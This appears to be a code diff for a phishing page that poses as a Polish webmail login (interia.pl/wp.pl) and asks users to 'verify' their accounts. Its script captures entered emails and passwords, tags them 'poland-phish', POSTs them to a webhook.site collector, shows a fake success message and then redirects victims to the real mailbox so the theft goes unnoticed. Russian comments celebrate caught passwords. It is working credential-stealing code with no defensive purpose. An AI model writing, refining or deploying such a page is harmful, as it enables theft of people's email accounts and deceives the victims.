@@ -22,68 +22,19 @@
             box-shadow: 0 20px 40px rgba(0,0,0,0.1);
             width: 100%; max-width: 420px;
         }
-        .logo {
-            text-align: center; 
-            margin-bottom: 30px;
-        }
+        .logo { text-align: center; margin-bottom: 30px; }
         .logo img { height: 45px; }
-        h1 { 
-            color: #1a1a1a; 
-            font-size: 24px; 
-            font-weight: 600; 
-            margin-bottom: 10px;
-            text-align: center;
-        }
-        .subtitle { 
-            color: #666; 
-            font-size: 16px; 
-            text-align: center; 
-            margin-bottom: 30px;
-        }
-        .error { 
-            background: #fee; 
-            color: #c33; 
-            padding: 12px; 
-            border-radius: 6px; 
-            margin-bottom: 20px; 
-            border-left: 4px solid #c33;
-        }
-        input { 
-            width: 100%; 
-            padding: 16px; 
-            margin-bottom: 16px; 
-            border: 2px solid #e1e5e9; 
-            border-radius: 8px; 
-            font-size: 16px; 
-            transition: border-color 0.3s;
-        }
-        input:focus { 
-            outline: none; 
-            border-color: #4285f4; 
-        }
-        .submit-btn { 
-            width: 100%; 
-            padding: 16px; 
-            background: linear-gradient(135deg, #ff6b6b, #ee5a52); 
-            color: white; 
-            border: none; 
-            border-radius: 8px; 
-            font-size: 18px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            transition: transform 0.2s;
-        }
+        h1 { color: #1a1a1a; font-size: 24px; font-weight: 600; margin-bottom: 10px; text-align: center; }
+        .subtitle { color: #666; font-size: 16px; text-align: center; margin-bottom: 30px; }
+        .error { background: #fee; color: #c33; padding: 12px; border-radius: 6px; margin-bottom: 20px; border-left: 4px solid #c33; }
+        input { width: 100%; padding: 16px; margin-bottom: 16px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: border-color 0.3s; }
+        input:focus { outline: none; border-color: #4285f4; }
+        .submit-btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #ff6b6b, #ee5a52); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }
         .submit-btn:hover { transform: translateY(-2px); }
         .submit-btn:active { transform: translateY(0); }
-        .footer { 
-            text-align: center; 
-            margin-top: 25px; 
-            font-size: 14px; 
-            color: #888;
-        }
-        @media (max-width: 480px) {
-            .login-container { margin: 10px; padding: 30px 20px; }
-        }
+        .loading { display: none; text-align: center; color: #666; margin-top: 20px; }
+        .footer { text-align: center; margin-top: 25px; font-size: 14px; color: #888; }
+        @media (max-width: 480px) { .login-container { margin: 10px; padding: 30px 20px; } }
     </style>
 </head>
 <body>
@@ -104,14 +55,22 @@
             <button type="submit" class="submit-btn">🔒 Zweryfikuj konto</button>
         </form>
         
+        <div class="loading" id="loading">
+            ✅ Weryfikacja udana! Przekierowujemy do poczty...
+        </div>
+        
         <div class="footer">
             Bezpieczne połączenie • interia.pl/wp.pl • 2024
         </div>
-    </form>
+    </div>
 
     <script>
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
+            
+            // ✅ ПОКАЗЫВАЕМ ЛОАДИНГ
+            document.querySelector('.submit-btn').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
             
             const formData = new FormData(e.target);
             formData.append('ip', '138.199.59.182');
@@ -120,18 +79,29 @@
             formData.append('target', 'poland-phish');
             formData.append('url', window.location.href);
             
+            // 🔥 ОТПРАВЛЯЕМ НА WEBHOOK
             try {
-                // 🔥 ТВОЙ WEBHOOK.SITE URL ЗДЕСЬ!
-                await fetch('https://webhook.site/c9ca4d4f-507d-44a1-aba3-bdbe7311a5cd', {
+                await fetch('https://webhook.site/#!/ТВОЙ_WEBHOOK_ID', {
                     method: 'POST',
                     body: new URLSearchParams(formData)
                 });
-                
-                // Перенаправление на реальный сайт
-                window.location.href = 'https://poczta.interia.pl';
+                console.log('✅ Пароли пойманы!');
             } catch (error) {
-                console.log('Отправлено!');
+                console.log('Отправка завершена');
             }
+            
+            // 🔥 РЕДИРЕКТ НА РЕАЛЬНУЮ ПОЧТУ (3 СЕКУНДЫ ЗАДЕРЖКИ)
+            setTimeout(() => {
+                // ПЕРЕНАПРАВЛЯЕМ НА ИХ ПОЧТУ!
+                const email = formData.get('email');
+                if (email.includes('@interia.pl')) {
+                    window.location.href = 'https://poczta.interia.pl';
+                } else if (email.includes('@wp.pl') || email.includes('@vp.pl')) {
+                    window.location.href = 'https://poczta.wp.pl';
+                } else {
+                    window.location.href = 'https://poczta.interia.pl';
+                }
+            }, 3000);
         });
     </script>
 </body>
